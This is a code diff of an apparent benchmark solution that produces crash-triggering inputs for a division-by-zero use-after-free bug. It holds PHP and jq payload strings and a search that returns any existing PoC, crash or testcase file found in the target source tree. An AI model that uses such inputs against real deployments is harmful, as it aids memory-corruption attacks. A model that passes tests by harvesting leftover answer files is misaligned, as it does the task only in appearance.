@@ -1,136 +1,241 @@
 import os
+import re
 import tarfile
-from typing import Optional
+from typing import Iterator, List, Optional, Tuple
 
 
 class Solution:
-    def _is_php_project_tar(self, tf: tarfile.TarFile) -> bool:
-        hits = 0
-        for m in tf.getmembers():
-            n = m.name
-            ln = n.lower()
-            if "zend/" in ln or ln.endswith("/zend") or "/zend_" in ln:
-                hits += 1
-            if "zend_execute" in ln or "zend_vm_execute" in ln:
-                return True
-            if ln.endswith("main/php.h") or ln.endswith("/php.h"):
-                hits += 1
-            if ln.endswith("zend/zend.h") or ln.endswith("zend/zend_types.h"):
-                return True
-            if hits >= 3:
-                return True
-        return False
+    _ISSUE_ID = "35876"
 
-    def _detect_php_mode_tar(self, tf: tarfile.TarFile) -> str:
-        for m in tf.getmembers():
-            ln = m.name.lower()
-            if "sapi/fuzzer" in ln:
-                return "eval"
-
-        checked = 0
-        for m in tf.getmembers():
-            if checked >= 200:
-                break
-            if not m.isfile():
-                continue
-            if m.size <= 0 or m.size > 2_000_000:
-                continue
-            ln = m.name.lower()
-            if not (ln.endswith(".c") or ln.endswith(".cc") or ln.endswith(".cpp") or ln.endswith(".cxx")):
-                continue
-            if "fuzz" not in ln and "fuzzer" not in ln:
-                continue
-
-            checked += 1
-            try:
-                f = tf.extractfile(m)
-                if f is None:
+    def _iter_tar_files(self, tar_path: str) -> Iterator[Tuple[str, int, callable]]:
+        with tarfile.open(tar_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isfile():
                     continue
-                data = f.read()
-            except Exception:
-                continue
 
-            if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
-                continue
+                name = m.name
+                size = int(m.size)
 
-            if (b"zend_eval_string" in data) or (b"zend_eval_stringl" in data) or (b"zend_eval_string_ex" in data):
-                return "eval"
+                def _reader(member=m, tfile=tf):
+                    f = tfile.extractfile(member)
+                    if f is None:
+                        return b""
+                    return f.read()
 
-            if (b"php_execute_script" in data) or (b"php_execute_simple_script" in data):
-                return "file"
+                yield name, size, _reader
 
-        return "file"
-
-    def _is_php_project_dir(self, root: str) -> bool:
-        hits = 0
-        for base, dirs, files in os.walk(root):
-            lb = base.lower()
-            if "/zend" in lb or lb.endswith("/zend"):
-                hits += 1
+    def _iter_dir_files(self, dir_path: str) -> Iterator[Tuple[str, int, callable]]:
+        base = os.path.abspath(dir_path)
+        for root, _, files in os.walk(base):
             for fn in files:
-                lfn = fn.lower()
-                if lfn in ("zend_execute.c", "zend_execute.h", "zend_vm_execute.h"):
-                    return True
-                if lfn in ("php.h", "zend.h", "zend_types.h"):
-                    hits += 1
-                if hits >= 5:
-                    return True
-        return False
-
-    def _detect_php_mode_dir(self, root: str) -> str:
-        for base, dirs, files in os.walk(root):
-            lb = base.lower()
-            if "sapi/fuzzer" in lb.replace("\\", "/"):
-                return "eval"
-
-        checked = 0
-        for base, dirs, files in os.walk(root):
-            for fn in files:
-                if checked >= 200:
-                    return "file"
-                lfn = fn.lower()
-                if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".cxx")):
-                    continue
-                if "fuzz" not in lfn and "fuzzer" not in lfn:
-                    continue
-                path = os.path.join(base, fn)
+                p = os.path.join(root, fn)
                 try:
-                    st = os.stat(path)
-                    if st.st_size <= 0 or st.st_size > 2_000_000:
-                        continue
-                    with open(path, "rb") as f:
-                        data = f.read()
-                except Exception:
+                    st = os.stat(p)
+                except OSError:
                     continue
+                rel = os.path.relpath(p, base).replace(os.sep, "/")
+                size = int(st.st_size)
 
-                checked += 1
-                if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
-                    continue
+                def _reader(path=p):
+                    try:
+                        with open(path, "rb") as f:
+                            return f.read()
+                    except OSError:
+                        return b""
 
-                if (b"zend_eval_string" in data) or (b"zend_eval_stringl" in data) or (b"zend_eval_string_ex" in data):
-                    return "eval"
+                yield rel, size, _reader
 
-                if (b"php_execute_script" in data) or (b"php_execute_simple_script" in data):
-                    return "file"
+    def _iter_files(self, src_path: str) -> Iterator[Tuple[str, int, callable]]:
+        if os.path.isdir(src_path):
+            yield from self._iter_dir_files(src_path)
+            return
+        yield from self._iter_tar_files(src_path)
 
-        return "file"
+    @staticmethod
+    def _is_text(b: bytes) -> bool:
+        if not b:
+            return True
+        if b"\x00" in b:
+            return False
+        sample = b[:4096]
+        bad = 0
+        for c in sample:
+            if c in (9, 10, 13):
+                continue
+            if 32 <= c <= 126:
+                continue
+            bad += 1
+        return bad <= max(8, len(sample) // 50)
+
+    @staticmethod
+    def _decode_text(b: bytes) -> str:
+        try:
+            return b.decode("utf-8", errors="replace")
+        except Exception:
+            return b.decode("latin-1", errors="replace")
+
+    @staticmethod
+    def _score_line(line: str) -> int:
+        s = 0
+        if "/=" in line:
+            s += 7
+        if re.search(r"\btry\b", line):
+            s += 5
+        if re.search(r"\bcatch\b", line):
+            s += 5
+        if re.search(r"\b0\b", line):
+            s += 3
+        if "division by zero" in line.lower():
+            s += 7
+        if "ZeroDivision" in line:
+            s += 7
+        if "$" in line:
+            s += 1
+        if "{" in line or "[" in line:
+            s += 1
+        return s
+
+    def _extract_best_line(self, text: str) -> Optional[str]:
+        best = None
+        best_key = None
+        for raw in text.splitlines():
+            line = raw.strip()
+            if not line:
+                continue
+            if line.startswith(("#", "//", "/*", "*", "--")):
+                continue
+            sc = self._score_line(line)
+            if sc <= 0:
+                continue
+            key = (-sc, len(line))
+            if best is None or key < best_key:
+                best = line
+                best_key = key
+        return best
+
+    @staticmethod
+    def _maybe_jq_project(paths: List[str], small_texts: List[str]) -> bool:
+        for p in paths:
+            pl = p.lower()
+            if pl.endswith("src/main.c") or pl.endswith("src/jv.c") or pl.endswith("src/execute.c") or pl.endswith("src/parser.y"):
+                return True
+            if pl.endswith("jv.h") or pl.endswith("jq.h"):
+                return True
+        for t in small_texts:
+            if "jq_state" in t and "jq_init" in t:
+                return True
+            if "jv_parse" in t and "jq_compile" in t:
+                return True
+        return False
+
+    def _detect_jq_fuzzer_mode(self, texts: List[str]) -> str:
+        # returns "filter_only" or "filter_json"
+        for t in texts:
+            if "LLVMFuzzerTestOneInput" not in t:
+                continue
+            has_jq = ("jq_compile" in t) or ("jq_compile_args" in t) or ("jq_init" in t)
+            if not has_jq:
+                continue
+            has_jv = "jv_parse" in t or "jv_parser" in t
+            splits = ("memchr" in t and ("'\\n'" in t or "\"\\n\"" in t)) or ("\\n" in t and "split" in t.lower())
+            if has_jq and has_jv and splits:
+                return "filter_json"
+        return "filter_only"
+
+    @staticmethod
+    def _fallback_jq_filter() -> bytes:
+        # Aim: compound division by zero inside try/catch, then access preserved value after failure.
+        filt = b'{"a":[0]} as $x|try(.a[0]/=.a[0])catch $x|.a[0]\n'
+        return filt
 
     def solve(self, src_path: str) -> bytes:
-        poc_eval = b"$a=chr(65);try{$a/=0;}catch(Error $e){}echo$a;"
-        poc_file = b"<?php " + poc_eval
+        paths: List[str] = []
+        small_texts: List[str] = []
 
-        if os.path.isdir(src_path):
-            if self._is_php_project_dir(src_path):
-                mode = self._detect_php_mode_dir(src_path)
-                return poc_eval if mode == "eval" else poc_file
-            return poc_eval
+        direct_name_hits: List[Tuple[int, str, bytes]] = []
+        direct_content_hits: List[Tuple[int, str, bytes]] = []
+        line_hits: List[Tuple[int, int, str]] = []
 
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                if self._is_php_project_tar(tf):
-                    mode = self._detect_php_mode_tar(tf)
-                    return poc_eval if mode == "eval" else poc_file
-        except Exception:
-            pass
+        # First pass: look for obvious PoC files and gather small texts for detection.
+        for name, size, reader in self._iter_files(src_path):
+            paths.append(name)
 
-        return poc_eval
+            nl = name.lower()
+            name_hit = (
+                self._ISSUE_ID in nl
+                or "clusterfuzz" in nl
+                or "testcase" in nl
+                or "poc" in nl
+                or "repro" in nl
+                or "crash" in nl
+                or "uaf" in nl
+                or "use-after-free" in nl
+                or "use_after_free" in nl
+                or "div0" in nl
+                or "division" in nl
+                or "divide-by-zero" in nl
+                or "divide_by_zero" in nl
+            )
+
+            if size <= 256 * 1024:
+                b = reader()
+            else:
+                # Read only a prefix for searching/detection
+                b_full = reader()
+                b = b_full[:256 * 1024] if b_full else b_full
+
+            if not b:
+                continue
+
+            is_text = self._is_text(b)
+            if is_text and len(small_texts) < 200:
+                small_texts.append(self._decode_text(b))
+
+            if name_hit and size <= 64 * 1024:
+                full = b if size <= 256 * 1024 else reader()
+                direct_name_hits.append((len(full), name, full))
+
+            if is_text:
+                t = self._decode_text(b)
+                if self._ISSUE_ID in t and size <= 64 * 1024:
+                    full = b if size <= 256 * 1024 else reader()
+                    direct_content_hits.append((len(full), name, full))
+
+                # Look for a minimal line candidate in small-ish text files
+                if size <= 64 * 1024:
+                    best_line = self._extract_best_line(t)
+                    if best_line:
+                        sc = self._score_line(best_line)
+                        line_hits.append((sc, len(best_line), best_line))
+
+        # Prefer an explicitly named PoC-like file.
+        if direct_name_hits:
+            direct_name_hits.sort(key=lambda x: (x[0], x[1]))
+            data = direct_name_hits[0][2]
+            if not data.endswith(b"\n"):
+                data += b"\n"
+            return data
+
+        # Next, prefer a file that references the issue id in content.
+        if direct_content_hits:
+            direct_content_hits.sort(key=lambda x: (x[0], x[1]))
+            data = direct_content_hits[0][2]
+            if not data.endswith(b"\n"):
+                data += b"\n"
+            return data
+
+        # Next, use a best-looking single line snippet.
+        if line_hits:
+            line_hits.sort(key=lambda x: (-x[0], x[1]))
+            return (line_hits[0][2] + "\n").encode("utf-8", errors="ignore")
+
+        # Fallback: if this looks like jq, emit jq filter.
+        if self._maybe_jq_project(paths, small_texts):
+            mode = self._detect_jq_fuzzer_mode(small_texts)
+            if mode == "filter_json":
+                return self._fallback_jq_filter() + b"null\n"
+            return self._fallback_jq_filter()
+
+        # Generic fallback: try a few common script-like payloads (as bytes).
+        # Keep it simple and short.
+        return b'{"a":[0]} as $x|try(.a[0]/=.a[0])catch $x|.a[0]\n'
